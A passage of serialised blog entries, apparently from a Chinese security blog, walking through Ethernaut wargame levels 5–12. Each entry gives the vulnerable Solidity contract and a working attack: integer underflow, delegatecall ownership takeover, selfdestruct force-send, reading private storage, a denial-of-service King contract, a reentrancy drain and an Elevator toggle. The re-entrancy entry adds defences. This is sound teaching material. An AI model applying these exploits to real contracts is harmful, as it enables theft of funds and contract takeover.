4、提交，收获胜利","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Token第5关练习","slug":"Ethernaut/5.Ethernaut-Token","date":"2021-07-23T07:27:00.000Z","updated":"2021-08-03T06:07:48.684Z","comments":true,"path":"/Ethernaut/Ethernaut/5.Ethernaut-Token/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/5.Ethernaut-Token/","excerpt":"","text":"Token第5关练习要求： 首先会给你20个token，想办法去获得更多的Token! 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Token { mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public { balances[msg.sender] = totalSupply = _initialSupply; }//构造函数,在一开始给合约一些钱 function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value &gt;= 0);//先检查调用者的余额是不是大于转账金额 balances[msg.sender] -= _value;//调用的人减金额_value balances[_to] += _value;//给目标增加金额_value return true; }//转账 function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; }//查询余额 } 合约分析：可以看到两个函数，一个是transfer，一个是balanceOf,构造函数定义了totalSupply。可控点是address,value。在transfer函数中有一处”require“校验，此处可以通过”整数下溢“来绕过检查，同时这里的balances和value都是无符号整数，以加减法为例，在 Solidity 中 (2**256 - 1) + 1 = 0 ， 0 - 1 = 2**256 - 1 。目标合约中如果我们传入的 value 大于 20，则 balances[msg.sender] - _value 会溢出变成极大数，如此可以顺利通过 require 检验，并使得发送者获得天量代币。 攻击流程：1、点击“Get new Instance”来获取一个实例。 2、查看初始化玩家的token数量，玩家地址 3、输入 这时候发生了一个情况rinkeby网络出现拥堵，存在一些问题无法使用，于是我们转到remix上进行 将代码复制到remix中点击 initialSupply输入20点击Deploy 查看到存在的Token为20，输入transfer中参数，输入其他任意地址和21，即可产生整数溢出，点击transfer,查看balanceOf 在网的话就顺利提交即可 好的亲爱的朋友们，可能是我的metamask钱包卡住了，我们尝试重设一下钱包，继续试试吧 get new instance后查看余额，输入contract.transfer(“0x8E27dCd7218F2C673A01Aa432707eBA771E6cb9E”,21) 直接输入可能会报错，可能是存在编译上的问题，我们加上引号就行。 确认以后查看balanceOf，开启代币土豪生涯","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Delegation第6关练习","slug":"Ethernaut/6.Ethernaut-Delegation","date":"2021-07-23T03:19:00.000Z","updated":"2021-08-03T06:08:33.261Z","comments":true,"path":"/Ethernaut/Ethernaut/6.Ethernaut-Delegation/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/6.Ethernaut-Delegation/","excerpt":"","text":"Delegation第6关练习要求： 此级别的目标是让您声明对所给实例的所有权。 可能有帮助的事情 查看 Solidity 关于函数的文档，它是如何工作的，它如何用于将操作委托给链上库，以及它对执行范围有什么影响。delegatecall fallback方法 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; }//构造函数 function pwn() public { owner = msg.sender; }//如果能调用这个pwn函数就可以了 } contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) public { delegate = Delegate(_delegateAddress);//把合约给实例化了 owner = msg.sender; } fallback() external { (bool result, bytes memory data) = address(delegate).delegatecall(msg.data); if (result) { this; }//fallback函数,其中的delegatecall跟call的区别在于 //前者所调用的函数在本合约中执行的,其他的信息都是自己合约的,相当于把函数拷贝到当前合约来执行 } } 合约分析：三种调用函数 在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式 以下是 Solidity 中 call 函数簇的调用模型： &lt;address&gt;.call(...) returns (bool) &lt;address&gt;.callcode(...) returns (bool) &lt;address&gt;.delegatecall(...) returns (bool) 这些函数提供了灵活的方式与合约进行交互，并且可以接受任何长度、任何类型的参数，其传入的参数会被填充至 32 字节最后拼接为一个字符串序列，由 EVM 解析执行。 在函数调用的过程中， Solidity 中的内置变量 msg 会随着调用的发起而改变，msg 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。 三种调用方式的异同点 call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。 delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。 callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。 在这里我们看到了两个合约，Delegate初始化时将传入的address设定为合约的owner，下面一个pwn函数也引起我们的注意，从名字也能看出挺关键的。之后下面的Delegation合约则实例化了上面的Delegate合约，其fallback函数使用了delegatecall来调用其中的delegate合约，而这里的delegatecall就是问题的关键所在。我们经常会使用call函数与合约进行交互，对合约发送数据，当然，call是一个较底层的接口，我们经常会把它封装在其他函数里使用，不过性质是差不多的，这里用到的delegatecall跟call主要的不同在于通过delegatecall调用的目标地址的代码要在当前合约的环境中执行，也就是说它的函数执行在被调用合约部分其实只用到了它的代码，所以这个函数主要是方便我们使用存在其他地方的函数，也是模块化代码的一种方法，然而这也很容易遭到破坏。当前上下文中进行执行，但是在 msg.sender 和 msg.value 的指向上却有差异。 在这里我们要做的就是使用delegatecall调用delegate合约的pwn函数，这里就涉及到使用call指定调用函数的操作，当你给call传入的第一个参数是四个字节时，那么合约就会默认这四个自己就是你要调用的函数，它会把这四个字节当作函数的id来寻找调用函数，而一个函数的id在以太坊的函数选择器的生成规则里就是其函数签名的sha3的前4个bytes，函数前面就是带有括号括起来的参数类型列表的函数名称。 经过上面的简要分析，问题就变很简单了，sha3我们可以直接通过web3.sha3来调用，而delegatecall在fallback函数里，我们得想办法来触发它，前面已经提到有两种方法来触发，但是这里我们需要让delegatecall使用我们发送的data，所以这里我们直接用封装好的sendTransaction来发送data，其实到了这里我也知道了前面fallback那关我们也可以使用这个方式来触发fallback函数： 观察题目我们可以发现 Delegation 的 fallback 函数会使用 delegatecall 调用 Delegate 合约，而 Delegate 合约中的 pwn() 函数就是用来修改 owner 的。因此我们只需要向 Delegation 合约发送一笔 msg.data 为 pwn() 函数签名的交易即可： 攻击流程：1、get net instance，查看玩家地址，合约地址，合约所有者 2、输入代码发现编译上存在问题修改一下为web.utils.sha3(\"pwn()\"); 3、现在再查看owner 拿到，提交成功 这里给大家几个建议： call、callcode、delegatecall调用的自由度极大，并且 call 会发生 msg 值的改变，需要谨慎的使用这些底层的函数；同时在使用时，需要对调用的合约地址、可调用的函数做严格的限制。 call 与 callcode 调用会改变 msg 的值，会修改 msg.sender 为调用者合约的地址，所以在合约中不能轻易将合约本身的地址作为可信地址。 delegatecall 与 callcode 会拷贝目标代码到自己的环境中执行，所以调用的函数应该做严格的限制，避开调用任意函数的隐患。 智能合约在部署前必须通过严格的审计和测试。","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Force第7关练习","slug":"Ethernaut/7.Ethernaut-Force","date":"2021-07-22T17:49:00.000Z","updated":"2021-08-02T08:27:30.407Z","comments":true,"path":"/Ethernaut/Ethernaut/7.Ethernaut-Force/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/7.Ethernaut-Force/","excerpt":"","text":"Force第7关练习要求： 让合约的balance比0多 合约代码：pragma solidity ^0.4.18; contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =ø= / (______)__m_m) */} 合约分析：有趣有趣真有趣，一个猫咪的空合约？ 经过查看资料，发现在以太坊里我们是可以强制给一个合约发送eth的，不管它要不要它都得收下，这是通过selfdestruct函数来实现的，如它的名字所显示的，这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送将无视这一点，这里确实是比较有趣了。那么接下来就非常简单了，我们只需要创建一个合约并存点eth进去然后调用selfdestruct将合约里的eth发送给我们的目标合约就行了。 攻击流程：1、拿取目标信息 2、在remix中插入攻击代码 // SPDX-License-Identifier: MIT pragma solidity ^0.4.20; contract Force { function Force() public payable {} function exploit(address _target) public { selfdestruct(_target); } } 这里需要注意版本，1wei，合约地址 exploit后 成功 4、提交胜利","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Vault第8关练习","slug":"Ethernaut/8.Ethernaut-Vault","date":"2021-07-21T10:22:00.000Z","updated":"2021-08-02T08:27:30.407Z","comments":true,"path":"/Ethernaut/Ethernaut/8.Ethernaut-Vault/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/8.Ethernaut-Vault/","excerpt":"","text":"Vault第8关练习要求： 解锁金库以通过关卡！ 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Vault { bool public locked; bytes32 private password;//定义了一个密码 constructor(bytes32 _password) public { locked = true;//构造函数,locked为true password = _password;//定义了一个password } function unlock(bytes32 _password) public { if (password == _password) { locked = false;//如果输入的密码正确就可以解锁 } } } 合约分析：从合约外如何读取私有变量 要求是令 locked = false , 其实就是要我们猜测 password 的值， 这里有个细节不论是 private 变量还是 public 变量都是会存储在区块链上的，就是说依然是公开的。 这里通过getStorageAt函数来访问它，getStorageAt函数可以让我们访问合约里状态变量的值，它的两个参数里第一个是合约的地址，第二个则是变量位置position，它是按照变量声明的顺序从0开始，顺次加1，不过对于mapping这样的复杂类型，position的值就没那么简单了。至于web3.js有新的学习任务了，参考链接：web3.js 教程 攻击流程：1、查看到他的合约地址通过web3.eth.getStorageAt拿到他的password，位置是在[1] 2、先将他进行Ascii解码，注意这里web3可能会用到web3.utils.hexToAscii或者web.utils.toAscii，通过alert或者console.info 的将他输出出来 web3.eth.getStorageAt(contract.address, 1,function(x,y){alert(web3.utils.hexToAscii(y))}) web3.eth.getStorageAt(contract.address, 1,function(x,y){console.info(web3.utils.toAscii(y))}) 3、最后，解锁，查看解锁状态 4、且慢，还有另一种方式， let password = await web3.eth.getStorageAt(instance, 1) contract.unlock(password) 赋值解锁效率更快 5、快乐提交","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"King第9关练习","slug":"Ethernaut/9.Ethernaut-King","date":"2021-07-21T08:52:00.000Z","updated":"2021-08-03T11:47:15.794Z","comments":true,"path":"/Ethernaut/Ethernaut/9.Ethernaut-King/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/9.Ethernaut-King/","excerpt":"","text":"King第9关练习要求： 给合约转钱，钱比上一个国王多就可以成为新的国王，并且不让别人抢国王的位置，过关条件是成为永久的国王。 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.sender; king = msg.sender;//构造函数,king是创建者 prize = msg.value;//prize是创建者发送的金额 } fallback() external payable { require(msg.value &gt;= prize || msg.sender == owner);//要求发送的金额大于等于king的金额或发送者是合约拥有着 king.transfer(msg.value);//把收到的金额转账给目前的king king = msg.sender;//king变成msg.sender prize = msg.value;//prize是现在这个king发送的金额数 } function _king() public view returns (address payable) { return king; } } 合约分析：这一题的灵感是来自King of the Ether，官网上有类似的例子 回到题目，观察合约可以知道，当 King 合约接收到转账的时候，会校验转账金额，通过校验的话，则向当前 King 退款并设置新的 King。我们的任务就是阻止新的 King 的设置，那么使得 King 合约执行到 king.transfer(msg.value) 时 revert 即可。当原智能合约有新的king诞生时会向我们的合约退还之前的奖金，但是攻击合约不接收，直接revert()那么就可以永远占据合约的king不放，简单的说就是谁发送大于 king 的金额就能成为新的 king，但是要先把之前的国王的钱退回去才能更改 king。只要我们一直不接受退回的奖金，那我们就能够一直保持 king 的身份： 可以参考地址类型成员变量 攻击合约如下，不设置 payable 的 fallback 函数或者在 fallback 函数中 revert 都可以。 pragma solidity ^0.4.18; contract attack{ function attack(address _addr) public payable{ _addr.call.gas(10000000).value(msg.value)(); }//先给合约一些钱,使得我们成为king function () public { revert();//在 fallback 函数中 revert } } 攻击流程：1、获取实例，需要支付1ETH 2、查看玩家地址，合约地址，国王地址，国王金额prize值（需要进行单位转换）如图，也就是现在国王的金额是1 eth。 3、部署攻击合约，按照箭头方向确认合约。VALUE处输入比1eth大的数就行，这里为了方便输入1001finney，地址填入题目合约地址，进行deploy 在钱包活动，Etherscan中可以看到新生成的攻击合约地址。 4、查看攻击合约地址，再次查看king地址，就变成了我们攻击合约的地址了（注意要重新赋值prize）： 5、提交实例，检查结果","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Re-Entrancy第10关练习","slug":"Ethernaut/10.Ethernaut-Re-entrancy","date":"2021-07-21T06:45:00.000Z","updated":"2021-08-02T08:27:30.396Z","comments":true,"path":"/Ethernaut/Ethernaut/10.Ethernaut-Re-entrancy/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/10.Ethernaut-Re-entrancy/","excerpt":"","text":"Re-entrancy第10关练习要求：此级别的目标是让您从合约中窃取所有资金。 可能有帮助的事情： 不受信任的合约可以在您最不期望的地方执行代码。 回退方法 抛出/恢复冒泡 有时，攻击合同的最佳方式是使用另一份合同。 “超越控制台”部分 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Reentrance { using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].add(msg.value); }//捐赠 function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; }//查看余额 function withdraw(uint _amount) public { if(balances[msg.sender] &gt;= _amount) {//提现金额要大于余额 (bool result, bytes memory data) = msg.sender.call.value(_amount)(\"\"); if(result) { _amount; }//提现 balances[msg.sender] -= _amount; }//但是这里是完成交易之后再从账户里面把提现的金额减去 } fallback() external payable {} } 合约分析：从上面的源代码可以确定这里应该为以太坊里的重入攻击，这也是之前The DAO事件里黑客所用到的攻击。在这里我们重点来看withdraw函数，我们可以看到它接收了一个amount参数，将其与发送者的balance进行比较，不超过发送者的balance就将这些amount发送给sender，同时我们注意到这里它用来发送ether的函数是call.value,发送完成后，它才在下面更新了sender的balances，这里就是可重入攻击的关键所在了，因为该函数在发送ether后才更新余额，所以我们可以想办法让它卡在call.value这里不断给我们发送ether，同样利用的是我们熟悉的fallback函数来实现。 当然，这里还有另外一个关键的地方——call.value函数特性，当我们使用call.value()来调用代码时，执行的代码会被赋予账户所有可用的gas,这样就能保证我们的fallback函数能被顺利执行，对应的，如果我们使用transfer和send函数来发送时，代码可用的gas仅有2300而已，这点gas可能仅仅只够捕获一个event，所以也将无法进行可重入攻击，因为send本来就是transfer的底层实现，所以他两性质也差不多。 因为他是提现完成之后才修改账户余额的，可以使用重入攻击 另外常用转币方式有三种，题目中用了第三种方法 .reansfer() 发送失败时会通过 throw 回滚状态，只会传递 2300 个 gas 以供调用，从而防止重入 .send() 发送失败时，返回布尔值 false，只会传递 2300 个 gas 以供调用，从而防止重入 .gas().call.value()() 当发送失败时，返回布尔值 false 将传递所有可用的 gas 进行调用（可通过 gas(gas _value) 进行限制），不能有效防止重入攻击 使用的EXP代码： pragma solidity ^0.4.18; contract Reentrance { mapping(address =&gt; uint) public balances; function donate(address _to) public payable { balances[_to] += msg.value; }//捐赠 function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; }//查看余额 function withdraw(uint _amount) public { if(balances[msg.sender] &gt;= _amount) { if(msg.sender.call.value(_amount)()) { _amount; }//提现 balances[msg.sender] -= _amount; } } function() public payable {} } contract Attack { address instance_address = 0xf9C751E4cc2fCE83242FEb07CD0Dc36cC4CCa01D; Reentrance target = Reentrance(instance_address); function Attack() public payable{} function donate() public payable { target.donate.value(msg.value)(this); }//首先,需要捐赠一些钱,满足withdraw的要求 function hack() public { target.withdraw(0.5 ether); }//然后调用合约的withdraw函数提现 function get_balance() public view returns(uint) { return target.balanceOf(this); } function my_eth_bal() public view returns(uint) { return address(this).balance; } function ins_eth_bal() public view returns(uint) { return instance_address.balance; } function () public payable { target.withdraw(0.5 ether); }//因为我们接受以太币的时候也会调用我们的回退函数 //而我们的回退函数中又一次调用了题目合约的withdraw函数 } 攻击流程：1、获取实例，查看合约地址，合约余额 2、在remix中部署合约，编译之后将合约部署到网络上，此时查看，可以看到 balance 为 0 Reentrance 账户余额 1 ether Attack 账户余额 0 ether 然后调用donate函数，我们需要在受攻击的合约里给我们的攻击合约地址增加一些balance以完成withdraw第一步的检查：首先在value处填写1 ether；以攻击者合约的身份向题目地址转账 1 ether； balance 为 1 ether Reentrance 账户余额 2 ether Attack 账户余额 0 ether 3、然后开始攻击，点击hack，成功以后观察： 到这里题目算是完成了，提交就行，但是没太能够理解，那就来复盘几次吧 攻击的思路依然是在fallback函数上做文章：在账户被修改余额前不断递归调用此函数，造成了银行账户被取光的效果。为了巩固对这个漏洞的理解，我们回头去看第一关，Fallback。 这里使用另一种方法进行donate，好吧，其实之前语法弄错，自己再来一次 通过控制台进行donate使用，语法参考web3.js，需要规范一下，不然会报错 contract.donate.sendTransaction('0xf9C751E4cc2fCE83242FEb07CD0Dc36cC4CCa01D',{value: web3.utils.toWei('1', 'ether')}) 之前直接使用这个toWei 报了格式的错误 contract.donate.sendTransaction(\"0xeE59e9DC270A52477d414f0613dAfa678Def4b02\",{value: toWei(1)}) “web3.js的单位” 加到0.5eth再执行上面的hack,观察到余额变为0，快乐提交 防御措施：1、在可能的情况下，将ether发送给外部地址时使用solidity内置的transfer()函数，transfer()转账时只发送2300gas，不足以调用另一份合约(即重入发送合约)，使用transfer()重写原合约的withdrawFunds()如下； function withdraw(uint _amount) public { if(balances[msg.sender] &gt;= _amount) { msg.sender.transfer(_amount); balances[msg.sender] -= _amount; } } 2、确保状态变量改变发生在ether被发送(或者任何外部调用)之前，即Solidity官方推荐的检查-生效-交互模式(checks-effects-interactions); function withdraw(uint _amount) public { if(balances[msg.sender] &gt;= _amount) {//检查 balances[msg.sender] -= _amount;//生效 msg.sender.transfer(_amount);//交互 } } 3、使用互斥锁：添加一个在代码执行过程中锁定合约的状态变量，防止重入调用 bool reEntrancyMutex = false; function withdraw(uint _amount) public { require(!reEntrancyMutex); reEntrancyMutex = true; if(balances[msg.sender] &gt;= _amount) { if(msg.sender.call.value(_amount)()) { _amount; } balances[msg.sender] -= _amount; reEntrancyMutex = false; } } 重入在这次攻击中发挥了重要作用，最终导致Ethereum Classic(ETC)的分叉，有关The DAO漏洞的详细分析，可参考下面这篇文章： Analysis of the DAO exploithackingdistributed.com 4、OpenZeppelin官方库 OpenZeppelin/openzeppelin-contractsgithub.com // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; /** * @dev Contract module that helps prevent reentrant calls to a function. * * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier * available, which can be applied to functions to make sure there are no nested * (reentrant) calls to them. * * Note that because there is a single `nonReentrant` guard, functions marked as * `nonReentrant` may not call one another. This can be worked around by making * those functions `private`, and then adding `external` `nonReentrant` entry * points to them. * * TIP: If you would like to learn more about reentrancy and alternative ways * to protect against it, check out our blog post * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]. */ abstract contract ReentrancyGuard { // Booleans are more expensive than uint256 or any type that takes up a full // word because each write operation emits an extra SLOAD to first read the // slot's contents, replace the bits taken up by the boolean, and then write // back. This is the compiler's defense against contract upgrades and // pointer aliasing, and it cannot be disabled. // The values being non-zero value makes deployment a bit more expensive, // but in exchange the refund on every call to nonReentrant will be lower in // amount. Since refunds are capped to a percentage of the total // transaction's gas, it is best to keep them low in cases like this one, to // increase the likelihood of the full refund coming into effect. uint256 private constant _NOT_ENTERED = 1; uint256 private constant _ENTERED = 2; uint256 private _status; constructor () { _status = _NOT_ENTERED; } /** * @dev Prevents a contract from calling itself, directly or indirectly. * Calling a `nonReentrant` function from another `nonReentrant` * function is not supported. It is possible to prevent this from happening * by making the `nonReentrant` function external, and make it call a * `private` function that does the actual work. */ modifier nonReentrant() { // On the first call to nonReentrant, _notEntered will be true require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\"); // Any calls to nonReentrant after this point will fail _status = _ENTERED; _; // By storing the original value once again, a refund is triggered (see // https://eips.ethereum.org/EIPS/eip-2200) _status = _NOT_ENTERED; } }","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Elevator第11关练习","slug":"Ethernaut/11.Ethernaut-Elevator","date":"2021-07-21T02:27:00.000Z","updated":"2021-08-02T08:27:30.397Z","comments":true,"path":"/Ethernaut/Ethernaut/11.Ethernaut-Elevator/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/11.Ethernaut-Elevator/","excerpt":"","text":"Elevator第11关练习要求：这台电梯不会让您到达建筑物的顶部。对吗？ 有时候，固执并不擅长守承诺。 这期望从.Elevator``Building 目标：成为 top，让变量 top 变为 true 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface Building { function isLastFloor(uint) external returns (bool); }//定义了一个接口,这个函数返回你是不是在最顶层 contract Elevator { bool public top;//布尔型变量,是否是top,默认false uint public floor;//楼层 function goTo(uint _floor) public { Building building = Building(msg.sender);//如果不是最顶层的话就进入if if (! building.isLastFloor(_floor)) { floor = _floor;//拿到你的_floor top = building.isLastFloor(floor);//让top等于判断结果,所以还是false }//但是如果你是top的话,没有改top的机会,所以还是false } } 合约分析：在合约的开头处有一个Building接口，定义了isLastFloor函数，返回值是bool，应该是用来返回这一楼层是否为最顶层，在接口里没有函数是已实现的，类似于抽象合约，可以理解为它仅仅用来提供一个标准，这样继承于它的合约就可以遵照它的标准来进行交互，而接口内的函数在其调用合约内定义即可。 之后在下面的主合约里，定义了一个bool型的top变量，在goto函数里对传入的_floor变量进行了判断，从逻辑上我们发现判断的条件里如果isLastFloor返回false，通过if后再将isLastFloor的返回值赋给top，这样的话我们的top还是个false，而这里我们要想让top的值变为true，那么我们得想个办法在isLastFloor上动动手脚，由于goTo函数调用了两次isLastFloor，因此我们可以将该函数构造为取反函数即可： pragma solidity ^0.4.18; interface Building { function isLastFloor(uint) external returns (bool); }//定义了一个接口,这个函数返回你是不是在最顶层 contract Elevator { bool public top;//布尔型变量,是否是top,默认false uint public floor;//楼层 function goTo(uint _floor) public { Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) {//如果不是最顶层的话就进入if floor = _floor;//拿到你的_floor top = building.isLastFloor(floor);//让top等于判断结果,所以还是false }//但是如果你是top的话,没有改top的机会,所以还是false } } contract BuildingEXP{ Elevator ele; bool t = true;//一开始定义为true function isLastFloor(uint) view public returns (bool) { t = !t;//在if那个地方要为false进入 //在top那个地方再次反转为false,这样就能保证top一直都是true啦 return t; } function attack(address _addr) public{ ele = Elevator(_addr); ele.goTo(5); } } 攻击流程：1、获取实例，查看合约地址，顶层bool值，还有floor 2、部署合约 发现有一处warning，是因为view产生的，因为在 view 函数中强行改属性也是可以通过编译的，所以可以忽略，有兴趣可以自行将view修改成payable或者no-payable也行 将合约地址进行传参，点击attack 可以看到我们的top变成了true，floor变成了5 3、这时候top就一直是顶层了，快乐提交就行","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Privacy第12关练习","slug":"Ethernaut/12.Ethernaut-Privacy","date":"2021-07-20T10:13:00.000Z","updated":"2021-08-02T08:27:30.397Z","comments":true,"path":"/Ethernaut/Ethernaut/12.Ethernaut-Privacy/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/12.Ethernaut-Privacy/","excerpt":"","text":"Privacy第12关练习要求：这份合约的创建者非常小心，以保护其存储的敏感区域。 解锁此合约以通关。 可能有帮助的事情： 了解存储的工作原理 了解参数解析的工作原理 了解铸造的工作原理 提示： 请记住，metamask 只是一种商品。如果出现问题，请使用其他工具。高级游戏可能涉及使用 remix 或您自己的 web3 提供商。 目标：解锁需要一个 key，而这个 key 是 data[2] 是 private 的 在区块链上面没有私密的东西，都是公开的，只要找到就能过关 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Privacy { bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; constructor(bytes32[3] memory _data) public { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */ } 合约分析：根据solidity 文档中的变量存储原则：静态大小的变量（除 映射mapping 和动态数组之外的所有类型）都从位置 0 开始连续放置在 存储storage 中。如果可能的话，存储需求少于 32 字节的多个变量会被打包到一个 存储插槽storage slot 中，规则如下： 存储插槽storage slot 的第一项会以低位对齐（即右对齐）的方式储存。 基本类型仅使用存储它们所需的字节。 如果 存储插槽storage slot 中的剩余空间不足以储存一个基本类型，那么它会被移入下一个 存储插槽storage slot 。 结构（struct）和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）。 存储storage 中的状态变量储存结构 例如，按照 uint128，uint128，uint256 的顺序声明你的存储变量，而不是 uint128，uint256，uint128， 因为前者只占用两个 存储插槽storage slot，而后者将占用三个。 分析一下合约中的变量： // 1 byte, slot 0 bool public locked = true; // 32 bytes, slot 1 uint256 public ID = block.timestamp; // 1 byte, slot 2 uint8 private flattening = 10; // 1 byte, slot 2 uint8 private denomination = 255; // 2 byte, slot 2 uint16 private awkwardness = uint16(now); // bytes32[0], 32 bytes, slot 3; bytes32[1], 32 bytes, slot 4; bytes32[2], 32 bytes, slot 5 bytes32[3] private data; 第一个变量是一个bool值占1个byte，和一个slot，按顺序下一个变量ID占有32个bytes，所以需要单独占一个存储插槽storage slot ，变量flattening,denomination,awkwardness加起来占有32bytes，所以他们3个变量占用一个存储槽，最后是3个32bytes的变量，各占一个。因为 function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } 我们所需要的data[2]就是存在于第六个slot中也就是slot 5中，取出的方法有： await web3.eth.getStorageAt(instance, 5); web3.eth.getStorageAt(instance,5,function(x,y){alert(y);}) web3.eth.getStorageAt(instance,5,function(x,y){console.info(y);}) 最后我们调用函数unlock即可解锁 需要注意的是，要解锁合约的 _key 是 bytes16 类型的，而 data 是 bytes32 类型的，bytes32 转换到 bytes 16 会截断超出的 bytes，也就是我们只取前 16 个 bytes 就好。 攻击流程：1、获取实例，查看锁状态 2、将第六个存储槽内容取出，slot5： web3.eth.getStorageAt(instance,5,function(x,y){console.info(y);}) 4、调用unlock函数解锁，应为它限定了是byte16所以他自己会截断，也可以手动取16bytes数据 5、为了更加直观的看到存储情况，我们将其一一打印出来对照 还可以观察发现变量flattening = 10 ,和denomination = 255在里面存储着 6、好了，玩的差不多，快乐提交吧，对了，网上有些地方过关的方法可能错误，多尝试，仔细甄别哦，理解原理才是关键","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Gatekeeper One第13关练习","slug":"Ethernaut/13.Ethernaut-Gatekeeper One","date":"2021-07-20T07:59:00.000Z","updated":"2021-08-02T08:27:30.398Z","comments":true,"path":"/Ethernaut/Ethernaut/13.Ethernaut-Gatekeeper One/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/13.Ethernaut-Gatekeeper%20One/","excerpt":"","text":"Gatekeeper One第13关练习要求：通过守门员并注册为进入者以通过此级别。 绕过三个 gate 来执行 